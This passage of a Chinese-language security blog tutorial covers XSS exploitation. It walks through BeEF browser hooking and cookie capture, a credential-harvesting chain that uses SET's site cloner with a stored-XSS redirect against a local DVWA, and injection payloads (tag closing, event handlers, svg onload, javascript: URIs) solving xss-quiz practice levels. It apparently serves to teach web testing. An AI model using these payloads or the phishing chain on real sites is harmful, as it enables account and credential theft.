class="line"></span><br><span class="line">持久化控制：</span><br><span class="line">1、确认弹窗</span><br><span class="line">2、小窗口</span><br><span class="line">3、中间人</span><br><span class="line"></span><br><span class="line">社会工程：</span><br><span class="line">1、点击劫持</span><br><span class="line">2、弹窗警告</span><br><span class="line">3、虚假页面</span><br><span class="line">4、钓鱼网站</span><br><span class="line"></span><br><span class="line">渗透攻击：</span><br><span class="line">1、内网渗透</span><br><span class="line">2、Metasploit</span><br><span class="line">3、CSRF攻击</span><br><span class="line">4、DDOS攻击</span><br></pre></td></tr></table></figure>

<h5 id="BeEF基础"><a href="#BeEF基础" class="headerlink" title="BeEF基础"></a>BeEF基础</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">启动Apache和BeEF</span><br><span class="line">servic apache2 start</span><br></pre></td></tr></table></figure>

<h5 id="启动beef"><a href="#启动beef" class="headerlink" title="启动beef"></a>启动beef</h5><p>给了你地址和脚本</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200409200826972.png" alt="image-20200409200826972"></p>
<p>可以不在kali中访问，直接复制地址在本机上访问，如果在本机访问不能使用127.0.0.1，需要改为kali的ip，进行访问，账号是beef密码是你自己当时开启beef时设置的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200411202430272.png" alt="image-20200411202430272"></p>
<p>在线浏览和离线浏览没有用户访问</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200409201153784.png" alt="image-20200409201153784"></p>
<p>当其他机器访问，我们这个也面时，就会执行XSS存储型漏洞</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412072641793.png" alt="image-20200412072641793"></p>
<p>查看beef页面，这两台主机访问了我们的页面，成功将其ip抓取</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412072738166.png" alt="image-20200412072738166"></p>
<p>查看beef的Current Browser模块下的Details子模块，Details子模块下的内容是浏览器的详细信息，里面包含了你当前浏览器的所有信息</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412073005775.png" alt="image-20200412073005775"></p>
<h5 id="查看Commands组件，里面是可能存在的攻击点"><a href="#查看Commands组件，里面是可能存在的攻击点" class="headerlink" title="查看Commands组件，里面是可能存在的攻击点"></a>查看Commands组件，里面是可能存在的攻击点</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412101121579.png" alt="image-20200412101121579"></p>
<p>可以攻击一下查看是否能成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412103408590.png" alt="image-20200412103408590"></p>
<p>上面是已经攻击完的，点击第三步，查看是否有cook值，页面返回cookie值说明页面攻击成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412103459549.png" alt="image-20200412103459549"></p>
<h5 id="命令颜色"><a href="#命令颜色" class="headerlink" title="命令颜色"></a>命令颜色</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">绿色	对目标主机生效并且不可见(不会被发现)</span><br><span class="line">橙色	对目标主机生效但可能可见(可能被发现)</span><br><span class="line">灰色	对目标主机未必生效(可验证下)</span><br><span class="line">红色	对目标主机不生效</span><br></pre></td></tr></table></figure>

<h4 id="XSS盗取用户信息"><a href="#XSS盗取用户信息" class="headerlink" title="XSS盗取用户信息"></a>XSS盗取用户信息</h4><h5 id="1、盗取用户信息原理"><a href="#1、盗取用户信息原理" class="headerlink" title="1、盗取用户信息原理"></a>1、盗取用户信息原理</h5><p>克隆网站登录页面，利用存储xss设置跳转代码，如果用户访问即跳转到克隆网站的登录页面，用户输入登录，账号和密码被存储。</p>
<p>用户正常访问存在XSS漏洞的原始站点，原始站点存在XSS漏洞，被利用之后进行跳转，跳转到被利用的克隆站点，克隆站点和原始站点类似，但是只克隆了他的登录界面，这个时候用户会访问到克隆站点的登录界面，这个时候可能由于安全意识的薄弱，会输入用户的账号密码，这样克隆站点就成功地读取了用户的用户名和密码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412162004695.png" alt="image-20200412162004695"></p>
<h5 id="2、setookit工具克隆网站"><a href="#2、setookit工具克隆网站" class="headerlink" title="2、setookit工具克隆网站"></a>2、setookit工具克隆网站</h5><p>这是本地dvwa的登录界面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164221318.png" alt="image-20200412164221318"></p>
<p>使用setookit来克隆一个登陆界面，在kali命令行中输入setookit</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164519559.png" alt="image-20200412164519559"></p>
<p>输入1选择Social-Engineering Attacks</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164637047.png" alt="image-20200412164637047"></p>
<p>输入2选择Website Attack Vectors</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164710431.png" alt="image-20200412164710431"></p>
<p>输入3选择Credential Harvester Attack Method</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164751037.png" alt="image-20200412164751037"></p>
<p>输入2选择Site Cloner，这个时候就会弹出kali的ip，不用输入内容直接回车</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164821609.png" alt="image-20200412164821609"></p>
<p>在这个位置输入本地的登录界面地址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164913334.png" alt="image-20200412164913334"></p>
<p>将红线位置地址输入到kali 上</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412165011200.png" alt="image-20200412165011200"></p>
<p>输入完回车，这就是已经复制成功了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412165059221.png" alt="image-20200412165059221"></p>
<p>访问kali的ip地址查看是否有登录界面，成功克隆完成</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412165149142.png" alt="image-20200412165149142"></p>
<h5 id="3、存储型xss跳转克隆网站"><a href="#3、存储型xss跳转克隆网站" class="headerlink" title="3、存储型xss跳转克隆网站"></a>3、存储型xss跳转克隆网站</h5><p>xss payload：<code>&lt;script&gt;window.location=&quot;跳转的URL&quot;&lt;/script&gt;</code> </p>
<h5 id="4、查看盗取账号和密码"><a href="#4、查看盗取账号和密码" class="headerlink" title="4、查看盗取账号和密码"></a>4、查看盗取账号和密码</h5><p>输入xss payload，上传，这里的ip地址改为kali的ip也就是跳转的ip</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412171407361.png" alt="image-20200412171407361"></p>
<p>发现页面成功跳转，输入用户名和密码登录，登录的时候观察上方ip的变化</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412171430380.png" alt="image-20200412171430380"></p>
<p>登录后，在kali中查看信息，发现成功获取了用户名和密码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412170229771.png" alt="image-20200412170229771"></p>
<h4 id="没有过滤的XSS"><a href="#没有过滤的XSS" class="headerlink" title="没有过滤的XSS"></a>没有过滤的XSS</h4><h5 id="1、实验环境介绍"><a href="#1、实验环境介绍" class="headerlink" title="1、实验环境介绍"></a>1、实验环境介绍</h5><p><a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/</a></p>
<p>一个日本安全研究员制作的XSS练习靶场</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412192339311.png" alt="image-20200412192339311"></p>
<h5 id="2、html中文本标签b介绍"><a href="#2、html中文本标签b介绍" class="headerlink" title="2、html中文本标签b介绍"></a>2、html中文本标签b介绍</h5><p><code>&lt;b&gt;</code>标签规定粗体文本。</p>
<p><code>&lt;p&gt;</code>标签是段落，在段落中加入<code>&lt;b&gt;</code>标签，这是粗体文本的话加粗，普通文本不加粗</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412192548959.png" alt="image-20200412192548959"></p>
<h5 id="3、探测XSS过程"><a href="#3、探测XSS过程" class="headerlink" title="3、探测XSS过程"></a>3、探测XSS过程</h5><p>1、构造一个独一无二且不会被识别为恶意代码的字符串用来提交到页面。</p>
<p>说白了就是随便输，爱输啥输啥</p>
<p>例如：156165161das651d65asd51</p>
<p>按F12使用箭头选中输入的文字</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412193629918.png" alt="image-20200412193629918"></p>
<h5 id="4、闭合文本标签利用XSS"><a href="#4、闭合文本标签利用XSS" class="headerlink" title="4、闭合文本标签利用XSS"></a>4、闭合文本标签利用XSS</h5><p>这是一个最简单Payload，这里可以直接输出domain。</p>
<p>因为<code>&lt;b&gt;</code>标签中加入<code>&lt;script&gt;</code>这个标签可以直接识别为JavaScript，那么就会弹出domain</p>
<p>1、简单的Payload：<code>&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412201400697.png" alt="image-20200412201400697"></p>
<p>提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412202013079.png" alt="image-20200412202013079"></p>
<p>点击确定，返回<strong>Congratulations!!</strong> </p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412202024254.png" alt="image-20200412202024254"></p>
<p>比较复杂的Payload，闭合方式的Payload。</p>
<p>首先闭合双引号然后闭合<code>&lt;b&gt;</code>标签，后面是<code>&lt;script&gt;</code>代码，前面会闭合后面会当做普通文本输出</p>
<p>HTML中的标签比如说<code>&lt;b&gt;</code>标签它以它开始之后是对应的文本，结束是<code>&lt;/b&gt;</code>，如果只有<code>&lt;/b&gt;</code>的话，它会当做简单的字符串处理，而不会当作一个标签处理。</p>
<p>2、闭合标签Payload：<code>&quot;&lt;/b&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></p>
<p>提交，点击确定</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412202312416.png" alt="image-20200412202312416"></p>
<p>返回<strong>Congratulations!!</strong> </p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412202332477.png" alt="image-20200412202332477"></p>
<h4 id="标签属性中的XSS"><a href="#标签属性中的XSS" class="headerlink" title="标签属性中的XSS"></a>标签属性中的XSS</h4><h5 id="1、配置Chrome关闭XSS-Auditor"><a href="#1、配置Chrome关闭XSS-Auditor" class="headerlink" title="1、配置Chrome关闭XSS-Auditor"></a>1、配置Chrome关闭XSS-Auditor</h5><p><a href="http://xss-quiz.int21h.jp/利用XSS过程中会出现下图情况。配置Chrome" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/利用XSS过程中会出现下图情况。配置Chrome</a> –args –disable-xss-auditor</p>
<p>右键谷歌浏览器复制地址，在桌面新建快捷方式，将地址复制进去，在将–args –disable-xss-auditor复制进去，就可以</p>
<p>这个配置只有在chrome提交xss信息报错XSS错误的时候用。如果没有报错就不需要配置了</p>
<h5 id="2、属性中得到XSS发现"><a href="#2、属性中得到XSS发现" class="headerlink" title="2、属性中得到XSS发现"></a>2、属性中得到XSS发现</h5><p>技巧：ctrl+F 搜索特定的字符串</p>
<p>页面并没有显示我们输入的内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412205955459.png" alt="image-20200412205955459"></p>
<p>按F12查看元素，可以直接使用箭头，然后选择输入框，也可以使用ctrl+f进行搜索</p>
<p>箭头这两处都可以。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412210200170.png" alt="image-20200412210200170"></p>
<h5 id="3、属性中的XSS闭合引入script"><a href="#3、属性中的XSS闭合引入script" class="headerlink" title="3、属性中的XSS闭合引入script"></a>3、属性中的XSS闭合引入script</h5><p>闭合引号尖括号，引入script</p>
<p>当然也可以在双引号前面加上值</p>
<p><code>&quot;&gt;&lt;script&gt;alert(document.domuin);&lt;/script&gt;</code>将这段代码复制到输入框提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412213252200.png" alt="image-20200412213252200"></p>
<p>提交，返回弹框点击确定</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412213328524.png" alt="image-20200412213328524"></p>
<p>返回<strong>Congratulations!!</strong> </p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412213356826.png" alt="image-20200412213356826"></p>
<h5 id="4、属性中的XSS闭合引入事件"><a href="#4、属性中的XSS闭合引入事件" class="headerlink" title="4、属性中的XSS闭合引入事件"></a>4、属性中的XSS闭合引入事件</h5><p>onmouseover意思就是当鼠标移动到输入框时弹出后面的内容</p>
<p>Payload：<code>&quot;onmouseover=alert(document.domain);&gt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412214012337.png" alt="image-20200412214012337"></p>
<p>提交之后将鼠标放到输入框上，就会弹出内容，将鼠标放到篮框中就会弹出内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412214101416.png" alt="image-20200412214101416"></p>
<p>返回<strong>Congratulations!!</strong> </p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412214152472.png" alt="image-20200412214152472"></p>
<h4 id="选择列表中的XSS"><a href="#选择列表中的XSS" class="headerlink" title="选择列表中的XSS"></a>选择列表中的XSS</h4><h5 id="1、HTML-select标签介绍"><a href="#1、HTML-select标签介绍" class="headerlink" title="1、HTML select标签介绍"></a>1、HTML select标签介绍</h5><p>select元素可以创建单选或多选菜单。</p>
<p><code>&lt;select&gt; 元素中的 &lt;option&gt;</code>标签用于定义列表中的可用选项</p>
<h5 id="2、表单介绍"><a href="#2、表单介绍" class="headerlink" title="2、表单介绍"></a>2、表单介绍</h5><p>HTML表单用于搜集不同类型的用户输入</p>
<p>可以使用浏览器查看提交的数据</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413092056335.png" alt="image-20200413092056335"></p>
<h5 id="3、Burpsuite测试XSS"><a href="#3、Burpsuite测试XSS" class="headerlink" title="3、Burpsuite测试XSS"></a>3、Burpsuite测试XSS</h5><p>使用burpsuite截取HTTP请求，修改提交参数</p>
<p>可以在蓝线处进行修改写入XSS</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413093804378.png" alt="image-20200413093804378"></p>
<h5 id="4、闭合触发XSS"><a href="#4、闭合触发XSS" class="headerlink" title="4、闭合触发XSS"></a>4、闭合触发XSS</h5><p>这里不管是闭合还是不闭合都可以弹出xss，都可以通关</p>
<p>蓝线处可以加<code>&lt;/option&gt;</code>来闭合前面的列表也可以不用闭合</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413093933071.png" alt="image-20200413093933071"></p>
<p>点击go查看页面显示。</p>
<p>页面并没有返回<strong>Congratulations!!</strong> 通关信息</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413094042891.png" alt="image-20200413094042891"></p>
<p>再点回Raw，复制链接</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413094159681.png" alt="image-20200413094159681"></p>
<p>点击Show response borwser，复制copy连接</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413094233493.png" alt="image-20200413094233493"></p>
<p>复制完连接去浏览器打开，成功出现弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413094259472.png" alt="image-20200413094259472"></p>
<p>确定返回Congratulations!!</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413094344690.png" alt="image-20200413094344690"></p>
<h4 id="隐藏参数中的XSS"><a href="#隐藏参数中的XSS" class="headerlink" title="隐藏参数中的XSS"></a>隐藏参数中的XSS</h4><h5 id="1、HTML表单隐藏参数介绍"><a href="#1、HTML表单隐藏参数介绍" class="headerlink" title="1、HTML表单隐藏参数介绍"></a>1、HTML表单隐藏参数介绍</h5><p>隐藏域就是用来收集或者发送消息的不可见元素，对于网页的访问者来说，隐藏于是看不见的。表单被提交时，隐藏域就会将信息用你设置时定义的名称和值发送到服务器上。</p>
<p>代码格式：<code>&lt;input type=&quot;hidden&quot; name=&quot;...&quot; value=&quot;...&quot;&gt;</code></p>
<h5 id="2、Burpsutie抓包测试"><a href="#2、Burpsutie抓包测试" class="headerlink" title="2、Burpsutie抓包测试"></a>2、Burpsutie抓包测试</h5><p>使用burpsutie进行抓包，截取提交的HTTP请求。</p>
<p>使用浏览器审计和burp对照</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413101509383.png" alt="image-20200413101509383"></p>
<h5 id="3、HTML中svg介绍"><a href="#3、HTML中svg介绍" class="headerlink" title="3、HTML中svg介绍"></a>3、HTML中svg介绍</h5><p>SVG意为可缩放矢量图形（Scalable Vector Graphics）</p>
<p>SVG使用XML格式定义图像。</p>
<p>SVG文件可通过以下标签嵌入HTML文档：<code>&lt;embed&gt;</code>、<code>&lt;object&gt;</code>或者<code>&lt;iframe&gt;</code>。也可以使用svg标签插入</p>
<p>这里可以是斜杠也可以是空格</p>
<p><code>&lt;svf/事件=&quot;&quot;&gt;</code></p>
<h5 id="4、闭合触发XSS-1"><a href="#4、闭合触发XSS-1" class="headerlink" title="4、闭合触发XSS"></a>4、闭合触发XSS</h5><p><code>&quot;&gt;</code>闭合属性，使用<code>&lt;svg onload=alert(document.domain);&gt;</code>弹出对应的内容，使用<code>%0a</code>替换空格，来讲标签之间有一个间隙</p>
<p>Payload：<code>&quot;&gt;&lt;svg onload=alert(document.domain);&gt;%0a</code></p>
<p>经过测试，在p1，p2后面输入xss代码，xss代码都会被网页直接输出，只有在p3的时候xss代码才没有回显到网页上。查看源代码发现，value显示了我们之前提交的内容，script脚本被加载到<code>type=&quot;hidden&quot;</code>和<code>value=&quot;hackme&quot;</code>当中，这时候我们可以使用闭合方式或者其他方式进行对应的测试。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413103113469.png" alt="image-20200413103113469"></p>
<p>我们使用闭合查看是否能被输出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413103928497.png" alt="image-20200413103928497"></p>
<p>页面成功被输出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413103956585.png" alt="image-20200413103956585"></p>
<p>点击确定，页面返回Congratulations!!</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413104028973.png" alt="image-20200413104028973"></p>
<p>上面说的是svg但这里实验的是script，当然svg也可以只是没必要非要用svg</p>
<p>演示，进行抓包，将svg的Payload复制到p3的hackme后面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413104605249.png" alt="image-20200413104605249"></p>
<p>Forward放行，查看页面是否返回，同样可以</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413104628621.png" alt="image-20200413104628621"></p>
<p>返回了Congratulations!! ，这样也行。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413104657566.png" alt="image-20200413104657566"></p>
<h4 id="限制输入长度的XSS"><a href="#限制输入长度的XSS" class="headerlink" title="限制输入长度的XSS"></a>限制输入长度的XSS</h4><h5 id="1、HTML表单文本框介绍"><a href="#1、HTML表单文本框介绍" class="headerlink" title="1、HTML表单文本框介绍"></a>1、HTML表单文本框介绍</h5><p>HTML表单用于搜索不用类型的用户输入，表单元素指的是不同类型的input元素、复选框，单选按钮，提交按钮等，text定义常规文本输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">属性介绍：</span><br><span class="line">value属性规定输入字段的初始值</span><br><span class="line">readonly属性规定输入字段为只读（不能修改）。</span><br><span class="line">disabled属性规定输入字段是禁用的，被禁用的元素是不可用的和不可点击的。被禁用的元素不会被提交</span><br><span class="line">size属性规定输入字段尺寸（以字符计）</span><br><span class="line">maxlength属性规定输入字段允许的最大长度</span><br><span class="line">如设置maxlength属性，则输入控件不会接受超过所允许数的字符</span><br><span class="line">该属性不会提供任何反馈，如果需要提醒用户，必须编写JavaScript代码</span><br></pre></td></tr></table></figure>

<h5 id="2、XSS-Payload长度计算"><a href="#2、XSS-Payload长度计算" class="headerlink" title="2、XSS Payload长度计算"></a>2、XSS Payload长度计算</h5><p>使用Python内置函数len(字符串)计算对应的字节数</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413111230387.png" alt="image-20200413111230387"></p>
<h5 id="3、浏览器审查工具修改源码"><a href="#3、浏览器审查工具修改源码" class="headerlink" title="3、浏览器审查工具修改源码"></a>3、浏览器审查工具修改源码</h5><p>当我们一直按住1的时候发现输入到15个长度就不能输入了，F12查看代码，发现maxlength限制了字符的长度是15。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413111547950.png" alt="image-20200413111547950"></p>
<p>我们可以进行更改，将15改为150，这样就可以输入更多的字符了，当然长度不能超过150</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413111727842.png" alt="image-20200413111727842"></p>
<h5 id="4、Payload触发XSS漏洞"><a href="#4、Payload触发XSS漏洞" class="headerlink" title="4、Payload触发XSS漏洞"></a>4、Payload触发XSS漏洞</h5><p>更改长度之后我们插入xss，闭合<code>&lt;input&gt;</code>，<code>&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;</code></p>
<p>提交信息，页面弹出弹框，说明成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413112410445.png" alt="image-20200413112410445"></p>
<p>点击确定返回Congratulations!! ，通关成功</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413112542216.png" alt="image-20200413112542216"></p>
<h4 id="HTML事件中的XSS"><a href="#HTML事件中的XSS" class="headerlink" title="HTML事件中的XSS"></a>HTML事件中的XSS</h4><h5 id="1、HTML事件介绍"><a href="#1、HTML事件介绍" class="headerlink" title="1、HTML事件介绍"></a>1、HTML事件介绍</h5><p>在现代浏览器中都内置大量的事件处理器。这些处理器会监事特定的条件或用户行为，例如鼠标单击，或浏览器窗口中完成加载某个图案。用过是用JavaScript，可以将某些特定的事件处理器作为属性添加给特定的标签，并可以在事件发生时执行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413133315239.png" alt="image-20200413133315239"></p>
<h5 id="2、XSS漏洞发现"><a href="#2、XSS漏洞发现" class="headerlink" title="2、XSS漏洞发现"></a>2、XSS漏洞发现</h5><p>说白了是随便打，F12能找到就行</p>
<p>设置独一无二字符串提交，在响应中寻找</p>
<p>随便输入字符，F12使用左上角箭头选择输入框，找到你输入的内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413133620268.png" alt="image-20200413133620268"></p>
<h5 id="3、闭合思路分析"><a href="#3、闭合思路分析" class="headerlink" title="3、闭合思路分析"></a>3、闭合思路分析</h5><p>我们可以发现，输入的XSS被当做字符串输出了，当做字符串输入就不会触发xss弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413135406234.png" alt="image-20200413135406234"></p>
<p>我们要通过HTML实践来触发XSS<code>&quot;onmouseover=&quot;alert(document.domain)</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413135708936.png" alt="image-20200413135708936"></p>
<p>提交，成功执行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413135729704.png" alt="image-20200413135729704"></p>
<h5 id="4、Payload触发XSS漏洞-1"><a href="#4、Payload触发XSS漏洞-1" class="headerlink" title="4、Payload触发XSS漏洞"></a>4、Payload触发XSS漏洞</h5><p>当然不止onmouseover这一种事件，在本关开头图片上的事件可以每个都尝试一下，这里在使用一次<code>onclick</code>来进行XSS</p>
<p>进行提交</p>
<p><code>&quot;onclick=&quot;alert(document.domain);</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413141408260.png" alt="image-20200413141408260"></p>
<p>提交之后单击输入框，就可以弹出XSS</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413141505272.png" alt="image-20200413141505272"></p>
<h4 id="空格分隔属性的XSS"><a href="#空格分隔属性的XSS" class="headerlink" title="空格分隔属性的XSS"></a>空格分隔属性的XSS</h4><h5 id="1、XSS探测"><a href="#1、XSS探测" class="headerlink" title="1、XSS探测"></a>1、XSS探测</h5><p>空格分隔属性探测</p>
<p>构造第一无二的字符串，F12找到</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413143908401.png" alt="image-20200413143908401"></p>
<p>当我们使用之前的方法闭合是没有用的，我们尝试一下使用空格分隔</p>
<p>当输入<code>111 2222</code>时，111在引号中，2222却在引号外出现，这样我们就可以直接使用XSS了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413144534630.png" alt="image-20200413144534630"></p>
<h5 id="2、触发XSS"><a href="#2、触发XSS" class="headerlink" title="2、触发XSS"></a>2、触发XSS</h5><p>这里不能使用script，尖括号被转义了，所以使用事件来进行XSS</p>
<p>使用onclick或者其他的都可以，这里使用的onclick，onmouseover也可以，其他事件可以挨个尝试</p>
<p>输入内容的时候，会自动在等于号后加双引号。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413145621371.png" alt="image-20200413145621371"></p>
<p>这里直接输入 <code>111 onclick=clart(document.domain)</code>，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413145044448.png" alt="image-20200413145044448">这里直接输入 <code>111 onclick=clart(document.domain)</code>，</p>
<h4 id="javascript伪协议的XSS"><a href="#javascript伪协议的XSS" class="headerlink" title="javascript伪协议的XSS"></a>javascript伪协议的XSS</h4><h5 id="1、jacascript伪协议介绍"><a href="#1、jacascript伪协议介绍" class="headerlink" title="1、jacascript伪协议介绍"></a>1、jacascript伪协议介绍</h5><p>将javascript代码添加到客户端的方法是把它放置在伪协议说明符javascript后的URL中。这个特殊的协议类型声明了URL的主体是任意的javascript代码，他由javascript的解析其运行，如果javascript：URL中<code>javascript:var now = new Date();&quot;&lt;h1&gt;The time is:&lt;/h1&gt;&quot;+ now;</code></p>
<p>javascript URL还可以含有只执行动作，但不返回值的javascript语句。</p>
<p><code>javascript:alert(&quot;hello word!&quot;)</code></p>
<h5 id="2、XSS漏洞发现-1"><a href="#2、XSS漏洞发现-1" class="headerlink" title="2、XSS漏洞发现"></a>2、XSS漏洞发现</h5><p>设置独一无二字符串提交，在响应中寻找。</p>
<p>这里输出了特殊字符串，说明可能存在XSS漏洞</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413152406498.png" alt="image-20200413152406498"></p>
<h5 id="3、a链接标签属性href介绍"><a href="#3、a链接标签属性href介绍" class="headerlink" title="3、a链接标签属性href介绍"></a>3、a链接标签属性href介绍</h5><p> <code>&lt;a&gt;</code>标签定义超链接。</p>
<p><code>&lt;a&gt;</code>元素最用要的属性是<code>href</code>属性，它指定链接的目标。</p>
<h5 id="4、Payload触发XSS漏洞-2"><a href="#4、Payload触发XSS漏洞-2" class="headerlink" title="4、Payload触发XSS漏洞"></a>4、Payload触发XSS漏洞</h5><p>Payload：javascript:alert(document.domain)</p>
<p>将Payload输入到输入框并提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413153224582.png" alt="image-20200413153224582"></p>
<p>单击超链接，查看返回效果，成功弹出弹框，并返回了Congratulations!!</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413153245648.png" alt="image-20200413153245648"></p>
<h5 id="因为第九关是UTF-7的编码形式，现在基本上浏览器已经移除了UTF-7编码了，所以想到达第10关就要作弊一下"><a href="#因为第九关是UTF-7的编码形式，现在基本上浏览器已经移除了UTF-7编码了，所以想到达第10关就要作弊一下" class="headerlink" title="因为第九关是UTF-7的编码形式，现在基本上浏览器已经移除了UTF-7编码了，所以想到达第10关就要作弊一下"></a>因为第九关是UTF-7的编码形式，现在基本上浏览器已经移除了UTF-7编码了，所以想到达第10关就要作弊一下</h5><h5 id="F12使用箭头选择红框那里的提示框，在id-”hide”后面加入XSS代码，鼠标放上去时弹出XSS，这样就绕过了第九关"><a href="#F12使用箭头选择红框那里的提示框，在id-”hide”后面加入XSS代码，鼠标放上去时弹出XSS，这样就绕过了第九关" class="headerlink" title="F12使用箭头选择红框那里的提示框，在id=”hide”后面加入XSS代码，鼠标放上去时弹出XSS，这样就绕过了第九关"></a>F12使用箭头选择红框那里的提示框，在id=”hide”后面加入XSS代码，鼠标放上去时弹出XSS，这样就绕过了第九关</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413193122104.png" alt="image-20200413193122104"></p>
<h4 id="绕过过滤domain为空的XSS"><a href="#绕过过滤domain为空的XSS" class="headerlink" title="绕过过滤domain为空的XSS"></a>绕过过滤domain为空的XSS</h4><h5 id="1、XSS漏洞发现"><a href="#1、XSS漏洞发现" class="headerlink" title="1、XSS漏洞发现"></a>1、XSS漏洞发现</h5><p>构造特殊无害字符串，响应中寻找字符串</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413193535545.png" alt="image-20200413193535545"></p>
<p>可以开到代码可以使用<code>&quot;&gt;</code>来闭合双引号和<code>&lt;input&gt;</code></p>
